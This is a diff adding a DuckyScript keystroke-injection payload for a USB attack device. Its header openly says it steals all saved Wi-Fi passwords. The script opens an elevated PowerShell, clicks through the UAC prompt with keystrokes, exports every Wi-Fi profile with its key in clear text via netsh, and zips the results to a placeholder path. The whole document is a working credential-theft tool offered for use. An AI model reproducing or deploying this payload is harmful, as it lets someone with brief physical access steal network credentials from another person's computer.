@@ -1,0 +1,21 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Steals all of the saved Wifi Passwords and stores them into a file.
+REM Version:	1.0
+REM Category:	Passwords
+DELAY 500
+WINDOWS d
+DELAY 500
+WINDOWS r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 800
+LEFTARROW
+ENTER
+DELAY 800
+ALT y
+DELAY 500
+GUI UP
+DELAY 600
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\Walkuer Ghost Report ' + $folderDateTime;$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;netsh wlan export profile key=clear folder=$fileSaveDir;Compress-Archive -Path $fileSaveDir -DestinationPath C:PUT PATH HERE\ResultsPassword.zip ; exit 
+ENTER
